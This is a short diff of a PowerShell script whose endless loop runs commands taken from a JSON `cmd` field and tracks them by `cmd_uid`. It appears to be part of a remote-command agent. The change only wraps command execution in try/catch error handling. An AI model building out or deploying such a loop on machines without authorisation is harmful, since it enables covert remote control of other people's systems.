@@ -106,12 +106,15 @@ while ($true) {
             $MODE = $JSON.json
         
             $CMD = $JSON.cmd
-            $RUN = RunCommand $CMD
-
-            if ($RUN -eq "" -or $RUN -eq $null) {
-                        $RUN = "No Result"
-                    }
             
+
+        try {
+                                    $RUN = RunCommand $CMD
+                                }
+                                catch {
+                                    $RUN = $_.Exception.Message
+                                }
+                        
             
          
             $CMD_UID = $JSON.cmd_uid
